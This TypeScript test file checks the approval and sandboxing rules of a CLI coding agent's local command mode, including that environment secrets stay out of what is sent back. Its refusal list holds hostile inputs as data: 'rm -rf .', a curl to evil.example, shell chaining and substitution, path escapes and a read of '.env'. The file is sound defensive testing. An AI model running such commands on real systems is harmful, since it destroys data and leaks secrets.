import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { runCli } from "../cli";
import { COMMAND_DECLINED } from "../local/agent";
import { INTERRUPT, LIVE_TERMINAL, finishTurn, harness, toolTurn } from "../testing/harness";
import { COMMAND_QUESTION, WRITE_QUESTION } from "./workspace";

/**
 * Running commands in local mode, through the real workspace loop. PawOS asks for a command; the
 * CLI checks it, shows exactly what would run and where, and runs it on this computer only once it
 * is allowed. The service's turns are scripted; the commands are real and harmless (node, npm),
 * in a folder made for the test.
 */
const cleanups: (() => void)[] = [];
let outer: string;
let root: string;

const SECRET = "s3cr3t-value-0123456789";
const CART = "exports.total = (items) => items.reduce((a, b) => a + b, 0);\n";
const read = (relative: string) => fs.readFileSync(path.join(root, relative), "utf8");
const exists = (relative: string) => fs.existsSync(path.join(root, relative));
const write = (relative: string, content: string) => {
  fs.mkdirSync(path.dirname(path.join(root, relative)), { recursive: true });
  fs.writeFileSync(path.join(root, relative), content);
};

beforeEach(() => {
  outer = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "pawos-local-commands-")));
  root = path.join(outer, "shop");
  fs.mkdirSync(root);
  write("package.json", JSON.stringify({ name: "shop", scripts: { test: "node test.js", build: "node build.js" } }));
  write("src/cart.js", CART);
  // Fails until the total refuses to go below zero.
  write("test.js", "const { total } = require('./src/cart.js');\nconst ok = total([5, -9]) === 0;\nconsole.log(ok ? 'Tests:       1 passed, 1 total' : 'Tests:       1 failed, 0 passed, 1 total');\nprocess.exit(ok ? 0 : 1);\n");
  write("build.js", "console.log('built');\n");
  write("mark.js", "require('fs').writeFileSync('ran.txt', 'x');\n");
  write("slow.js", "console.log('started'); setInterval(() => {}, 1000);\n");
  write(".env", `API_KEY=${SECRET}\n`);
  process.env.PAWOS_TEST_SECRET_TOKEN = SECRET;
  cleanups.push(() => {
    delete process.env.PAWOS_TEST_SECRET_TOKEN;
    fs.rmSync(outer, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
  });
});
afterEach(() => {
  for (const cleanup of cleanups.splice(0)) cleanup();
});

const start = (options: Parameters<typeof harness>[0] = {}) => {
  const h = harness({ signedIn: true, workspaceRoot: root, cwd: root, ...options });
  cleanups.push(h.cleanup);
  return h;
};
const TASK_QUESTION = "  Allow? [y] allow  [n] deny  [a] always allow\n\n  > ";
const TASK = "Fix the cart total in src/cart.js";
const EDIT = { path: "src/cart.js", oldText: "items.reduce((a, b) => a + b, 0)", newText: "Math.max(0, items.reduce((a, b) => a + b, 0))" };
type Sent = { id: string; ok: boolean; output: string; denied?: boolean; exitCode?: number | null; cancelled?: boolean; timedOut?: boolean };
const results = (h: ReturnType<typeof harness>) => h.server.agentCalls().slice(1).map((call) => call.body!.result as Sent);
const cmd = (id: string, command: string, args: string[] = [], cwd?: string) => toolTurn(id, "run_command", { command, args, ...(cwd === undefined ? {} : { cwd }) });
const asks = (h: ReturnType<typeof harness>) => h.prompter.prompts.filter((prompt) => prompt === COMMAND_QUESTION).length;
const remoteCalls = (h: ReturnType<typeof harness>) => h.server.calls.filter((call) => call.path.startsWith("/api/web/changes") || call.body?.mode === "codeChange" || (call.path.startsWith("/api/web/github") && call.method !== "GET") || call.path === "/api/web-chat/messages");

describe("end to end: read, edit, run the tests, read again, finish", () => {
  it("task → read → edit approved → file changes → command shown → approved → runs locally → output returned → read → finish → summary", async () => {
    const h = start({ answers: [TASK, "y", "y", "y", "y", null], permissionMode: "ask" });
    h.server.agentTurns = [
      toolTurn("step-1", "read_file", { path: "src/cart.js" }, "Look at the total"),
      toolTurn("step-2", "run_tests", {}, "See what fails"),
      toolTurn("step-3", "edit_file", EDIT, "Never go below zero"),
      toolTurn("step-4", "run_tests", {}, "Check the fix"),
      toolTurn("step-5", "read_file", { path: "src/cart.js" }),
      finishTurn("The total can no longer be negative.\nThe test failed before the change and passes after it."),
    ];
    expect(await runCli([], h.ctx)).toBe(0);

    // Asked to start, then for each command and for the change — in the order they happened.
    expect(h.prompter.prompts).toEqual(["  > ", TASK_QUESTION, COMMAND_QUESTION, WRITE_QUESTION, COMMAND_QUESTION, "  > "]);
    expect(read("src/cart.js")).toBe("exports.total = (items) => Math.max(0, items.reduce((a, b) => a + b, 0));\n");

    // The command was shown exactly, with the folder it runs in, before the question.
    const screen = h.output();
    const shown = screen.slice(screen.indexOf("PawOS wants to run:"), screen.indexOf(COMMAND_QUESTION));
    expect(shown).toContain("PawOS wants to run:\n\n    npm test\n\n  Directory:\n    " + root);

    // What PawOS was told, turn by turn: the tests really failed first, and really passed after the edit.
    const sent = results(h);
    expect(h.server.agentCalls()).toHaveLength(6);
    expect(sent[0]).toMatchObject({ id: "step-1", ok: true });
    expect(sent[1]).toMatchObject({ id: "step-2", ok: false, exitCode: 1 });
    expect(sent[1]!.output).toContain("$ npm test   (in .)\nExit code 1.\nTests failed: 0 passed, 1 failed, 1 in all.");
    expect(sent[2]).toEqual({ id: "step-3", ok: true, output: "Edited src/cart.js: 1 replacement (1 line removed, 1 added)." });
    expect(sent[3]).toMatchObject({ id: "step-4", ok: true, exitCode: 0 });
    expect(sent[3]!.output).toContain("Exit code 0.\nTests passed: 1 passed, 0 failed, 1 in all.");
    expect(sent[4]).toMatchObject({ id: "step-5", ok: true, output: expect.stringContaining("Math.max(0, items.reduce") });

    // The summary, and an exact account of what was done on this computer.
    expect(screen).toContain("The test failed before the change and passes after it.");
    expect(screen).toContain("PawOS made 1 change in shop:");
    expect(screen).toContain("The changes are on this computer only. PawOS did not commit or push them.");
    expect(screen).toContain("PawOS ran 2 commands on this computer:");
    expect(screen).toContain("npm test  exit code 1");
    expect(screen).toContain("npm test  exit code 0");

    // Nothing sent to PawOS names where the project is, or carries the environment.
    const everything = JSON.stringify(h.server.agentCalls().map((call) => call.body));
    expect(everything).not.toContain(JSON.stringify(outer).slice(1, -1));
    expect(everything).not.toContain(SECRET);
    expect(remoteCalls(h)).toEqual([]);
  }, 120_000);
});

describe("ask mode: every command waits for a yes", () => {
  it("allowed command: shown, approved, run, and its output returned", async () => {
    const h = start({ answers: [TASK, "y", "y", null], permissionMode: "ask" });
    h.server.agentTurns = [cmd("step-1", "node", ["--version"]), finishTurn("Checked.")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(asks(h)).toBe(1);
    expect(results(h)[0]).toMatchObject({ id: "step-1", ok: true, exitCode: 0, output: expect.stringMatching(/--- output ---\nv\d+\./) });
    expect(h.output()).toContain("    node --version");
    expect(h.output()).toContain("Allowed.");
    expect(h.output()).toContain("PawOS ran 1 command on this computer:");
  });

  it.each([["n"], [""], ["no"], ["deny"]])("denied command (%j): nothing runs and the model is told", async (answer) => {
    const h = start({ answers: [TASK, "y", answer, null], permissionMode: "ask" });
    h.server.agentTurns = [cmd("step-1", "node", ["mark.js"]), finishTurn("Not run.")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(exists("ran.txt")).toBe(false);
    expect(results(h)[0]).toEqual({ id: "step-1", ok: false, denied: true, output: COMMAND_DECLINED });
    expect(h.output()).toContain("Denied. Nothing was run.");
    expect(h.output()).not.toContain("PawOS ran");
  });

  it("an answer that isn't an answer is asked again; there is no 'always' for commands", async () => {
    const h = start({ answers: [TASK, "y", "a", "always", "sure", "n", null], permissionMode: "ask" });
    h.server.agentTurns = [cmd("step-1", "node", ["mark.js"]), finishTurn("x")];
    await runCli([], h.ctx);
    expect(asks(h)).toBe(4);
    expect(h.output()).toContain("Please answer y or n.");
    expect(exists("ran.txt")).toBe(false);
  });

  it("'always allow' given for changing files does not cover commands", async () => {
    const h = start({ answers: [TASK, "a", "a", "n", null], permissionMode: "ask" });
    h.server.agentTurns = [toolTurn("step-1", "edit_file", EDIT), cmd("step-2", "node", ["--version"]), finishTurn("x")];
    await runCli([], h.ctx);
    expect(h.prompter.prompts).toEqual(["  > ", TASK_QUESTION, WRITE_QUESTION, COMMAND_QUESTION, "  > "]);
    expect(results(h)[1]).toMatchObject({ denied: true });
  });

  it("each command is its own question", async () => {
    const h = start({ answers: [TASK, "y", "y", "y", null], permissionMode: "ask" });
    h.server.agentTurns = [cmd("step-1", "node", ["--version"]), cmd("step-2", "node", ["--version"]), finishTurn("x")];
    await runCli([], h.ctx);
    expect(asks(h)).toBe(2);
  });
});

describe("auto mode", () => {
  it("a routine development command runs without a question, and is still shown", async () => {
    const h = start({ answers: [TASK, null], permissionMode: "auto" });
    h.server.agentTurns = [cmd("step-1", "node", ["--version"]), toolTurn("step-2", "build", {}), finishTurn("Built.")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(h.prompter.prompts).toEqual(["  > ", "  > "]);
    expect(h.output()).toContain("PawOS wants to run:\n\n    node --version\n\n  Directory:\n    " + root);
    expect(h.output()).toContain("    npm run build");
    expect(h.output()).toContain("Allowed: auto mode runs routine development commands without asking.");
    expect(results(h).map((result) => result.exitCode)).toEqual([0, 0]);
    expect(results(h)[1]!.output).toContain("built");
  }, 60_000);

  it.each([
    ["package installation", "npm", ["install"], "It can install, remove or change this project's dependencies."],
    ["installing one package", "npm", ["i", "left-pad"], "It can install, remove or change this project's dependencies."],
    ["a clean install", "npm", ["ci"], "It can install, remove or change this project's dependencies."],
    ["yarn add", "yarn", ["add", "left-pad"], "It can install, remove or change this project's dependencies."],
    ["pnpm install", "pnpm", ["install"], "It can install, remove or change this project's dependencies."],
    ["removing a dependency", "npm", ["uninstall", "left-pad"], "It can install, remove or change this project's dependencies."],
    ["pip install", "pip", ["install", "requests"], "It can install, remove or change this project's dependencies."],
    ["npx fetching a package", "npx", ["cowsay", "hi"], "npx can download a package and run it."],
    ["a force flag on a routine command", "npm", ["test", "--force"], "It forces something that is normally checked."],
    ["code given on the command line", "node", ["-e", "1"], "It runs code given on the command line."],
    ["a program from the project", "node", ["mark.js"], "It runs a program from this project."],
  ])("always-ask commands: %s is asked about even in auto mode", async (_label, program, args, reason) => {
    const h = start({ answers: [TASK, "n", null], permissionMode: "auto" });
    h.server.agentTurns = [cmd("step-1", program, args), finishTurn("x")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(h.prompter.prompts).toEqual(["  > ", COMMAND_QUESTION, "  > "]);
    expect(h.output()).toContain(`PawOS always asks before this: ${reason}`);
    expect(results(h)[0]).toEqual({ id: "step-1", ok: false, denied: true, output: COMMAND_DECLINED });
    expect(exists("ran.txt")).toBe(false);
    expect(exists("node_modules")).toBe(false);
  });

  it.each([["ask"], ["auto"]] as const)("Git mutation cannot happen through run_command (%s mode): refused without a question", async (permissionMode) => {
    const h = start({ answers: [TASK, ...(permissionMode === "ask" ? ["y"] : []), null], permissionMode });
    const tried: string[][] = [["add", "."], ["commit", "-m", "wip"], ["push"], ["push", "--force"], ["pull"], ["checkout", "."], ["checkout", "main"], ["switch", "main"], ["reset", "--hard"], ["clean", "-fd"], ["restore", "."], ["merge", "main"], ["rebase", "main"], ["cherry-pick", "abc123"], ["branch", "feature"], ["branch", "-D", "main"], ["tag", "v1"], ["stash"], ["commit", "--amend"]];
    h.server.agentTurns = [...tried.map((args, index) => cmd(`step-${index + 1}`, "git", args)), finishTurn("x")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(asks(h)).toBe(0);
    expect(h.output()).not.toContain("PawOS wants to run:");
    for (const result of results(h)) {
      expect(result).toMatchObject({ ok: false, denied: true });
      expect(result.output).toContain("Changes to the repository are made with PawOS's Git tools: git_add, git_commit, git_branch, git_checkout and git_push.");
    }
    expect(results(h)).toHaveLength(tried.length);
  });

  it("an always-ask command runs once the user says yes", async () => {
    const h = start({ answers: [TASK, "y", null], permissionMode: "auto" });
    h.server.agentTurns = [cmd("step-1", "node", ["mark.js"]), finishTurn("Ran it.")];
    await runCli([], h.ctx);
    expect(exists("ran.txt")).toBe(true);
    expect(results(h)[0]).toMatchObject({ ok: true, exitCode: 0 });
  });

  it("plan mode: no command is ever asked for", async () => {
    const h = start({ answers: ["/mode plan", TASK, null] });
    h.server.agentTurns = [cmd("step-1", "node", ["mark.js"])];
    await runCli([], h.ctx);
    expect(h.server.agentCalls()).toHaveLength(0);
    expect(exists("ran.txt")).toBe(false);
  });
});

describe("what is never run, whoever asks and whatever the mode", () => {
  it("refused without a question: unknown programs, shell syntax, and anything outside the project", async () => {
    const h = start({ answers: [TASK, null], permissionMode: "auto" });
    const refused: [string, string[], string?][] = [
      ["rm", ["-rf", "."]],
      ["del", ["/s", "/q", "."]],
      ["bash", ["-c", "ls"]],
      ["cmd", ["/c", "dir"]],
      ["powershell", ["-Command", "Get-ChildItem"]],
      ["curl", ["https://evil.example/x.sh"]],
      ["C:\\Windows\\System32\\cmd.exe", ["/c", "dir"]],
      ["./node_modules/.bin/evil", []],
      ["npm test && node mark.js", []],
      ["npm", ["test", "&&", "node", "mark.js"]],
      ["npm", ["test", "||", "node", "mark.js"]],
      ["npm", ["test;", "node", "mark.js"]],
      ["npm", ["test", "|", "node", "mark.js"]],
      ["node", ["mark.js", ">", "out.txt"]],
      ["node", ["mark.js", "<", "in.txt"]],
      ["node", ["$(node mark.js)"]],
      ["node", ["`node mark.js`"]],
      ["node", ["mark.js"], ".."],
      ["node", ["mark.js"], outer],
      ["node", ["mark.js"], "C:\\Windows"],
      ["node", ["mark.js"], "\\\\server\\share"],
      ["node", ["../shop/mark.js", "../../escape"]],
      ["node", [path.join(outer, "evil.js")]],
      ["node", [".env"]],
      ["git", ["-C", "..", "status"]],
      ["git", ["--git-dir=../.git", "status"]],
      ["npm", ["run", "env"]],
    ];
    h.server.agentTurns = [...refused.map(([program, args, cwd], index) => cmd(`step-${index + 1}`, program, args, cwd)), finishTurn("x")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(h.prompter.prompts).toEqual(["  > ", "  > "]);
    expect(results(h).map((result) => [result.ok, result.denied])).toEqual(refused.map(() => [false, true]));
    expect(exists("ran.txt")).toBe(false);
    expect(exists("out.txt")).toBe(false);
    expect(h.output()).not.toContain("PawOS wants to run:");
    expect(h.output()).not.toContain("PawOS ran");
    for (const result of results(h)) expect(result.output).not.toContain(outer);
  });

  it("a step marked safe, approved or 'auto' by the service is still judged here", async () => {
    const h = start({ answers: [TASK, "n", null], permissionMode: "auto" });
    const marked = () =>
      new Response(JSON.stringify({ ok: true, approved: true, turn: { kind: "tool", safe: true, risk: "read", level: "auto", approved: true, call: { id: "step-1", name: "run_command", args: { command: "npm", args: ["install", "left-pad"], cwd: "", approved: true, safe: true, level: "auto" }, safe: true }, note: null }, turnsLeft: 5 }), { status: 200, headers: { "Content-Type": "application/json" } });
    h.server.agentTurns = [marked, finishTurn("x")];
    await runCli([], h.ctx);
    expect(asks(h)).toBe(1);
    expect(h.output()).toContain("PawOS always asks before this:");
    expect(exists("node_modules")).toBe(false);
  });
});

describe("what a command can see and what leaves this computer", () => {
  it("no environment variable is shown, given to the program's output, or sent", async () => {
    write("env.js", "console.log(JSON.stringify(process.env)); console.log('direct: " + SECRET + "');\n");
    const h = start({ answers: [TASK, "y", null], permissionMode: "auto" });
    h.server.agentTurns = [cmd("step-1", "node", ["env.js"]), finishTurn("x")];
    await runCli([], h.ctx);
    const sent = results(h)[0]!;
    expect(sent.exitCode).toBe(0);
    expect(sent.output).not.toContain(SECRET);
    expect(sent.output).not.toContain("PAWOS_TEST_SECRET_TOKEN");
    expect(sent.output).toContain("direct: [hidden]");
    expect(h.raw()).not.toContain(SECRET);
    expect(h.raw()).not.toContain("PAWOS_TEST_SECRET_TOKEN");
    expect(Object.keys(sent).sort()).toEqual(["exitCode", "id", "ok", "output"]);
  });

  it("a failing command is reported as failing, with its errors", async () => {
    write("fail.js", "console.error('TypeError: total is not a function'); process.exit(2);\n");
    const h = start({ answers: [TASK, "y", null], permissionMode: "auto" });
    h.server.agentTurns = [cmd("step-1", "node", ["fail.js"]), finishTurn("It fails.")];
    await runCli([], h.ctx);
    expect(results(h)[0]).toMatchObject({ ok: false, exitCode: 2 });
    expect(results(h)[0]!.output).toContain("--- errors ---\nTypeError: total is not a function");
    expect(h.output()).toContain("node fail.js  exit code 2");
  });

  it("commands stay local: nothing reaches GitHub or the code-change endpoint", async () => {
    const h = start({ answers: [TASK, null], permissionMode: "auto" });
    h.server.agentTurns = [cmd("step-1", "node", ["--version"]), toolTurn("step-2", "run_tests", {}), finishTurn("x")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(remoteCalls(h)).toEqual([]);
    expect(h.server.starts()).toHaveLength(0);
    expect(h.server.calls.filter((call) => call.method !== "GET" && !call.path.startsWith("/api/auth/")).map((call) => call.path)).toEqual(Array.from({ length: 3 }, () => "/api/web/agent/turn"));
  }, 60_000);

  it("the progress display is gone when the task ends", async () => {
    const h = start({ answers: [TASK, "y", "y", null], permissionMode: "ask", caps: LIVE_TERMINAL });
    h.server.agentTurns = [cmd("step-1", "node", ["--version"]), finishTurn("Done.")];
    await runCli([], h.ctx);
    expect(h.timers.active).toBe(0);
    expect(h.listening()).toBe(0);
  });
});

describe("Ctrl+C", () => {
  it("at the question for a command: a no, nothing runs, and the task stops", async () => {
    const h = start({ answers: [TASK, "y", INTERRUPT, "n", null], permissionMode: "ask" });
    h.server.agentTurns = [cmd("step-1", "node", ["mark.js"]), finishTurn("never shown")];
    expect(await runCli([], h.ctx)).toBe(0);
    expect(exists("ran.txt")).toBe(false);
    expect(h.server.agentCalls()).toHaveLength(1);
    expect(h.output()).toContain("Stopped. Nothing is still running.");
    expect(h.output()).not.toContain("never shown");
  });

  it("while a command runs: it is stopped, the task stops, and PawOS stays open", async () => {
    const h = start({ answers: [TASK, "y", "n", null], permissionMode: "auto" });
    h.server.agentTurns = [
      () => {
        // The user allows it (the next answer), it starts, and then they press Ctrl+C.
        setTimeout(() => h.interrupt(), 1500);
        return cmd("step-1", "node", ["slow.js"]);
      },
      finishTurn("never shown"),
    ];
    const started = Date.now();
    expect(await runCli([], h.ctx)).toBe(0);
    expect(Date.now() - started).toBeLessThan(20_000);
    expect(h.server.agentCalls()).toHaveLength(1);
    expect(h.output()).toContain("Stopped. Nothing is still running.");
    expect(h.output()).toContain("node slow.js  stopped");
    expect(h.output()).not.toContain("never shown");
    expect(h.listening()).toBe(0);
    expect(h.timers.active).toBe(0);
  }, 60_000);
});
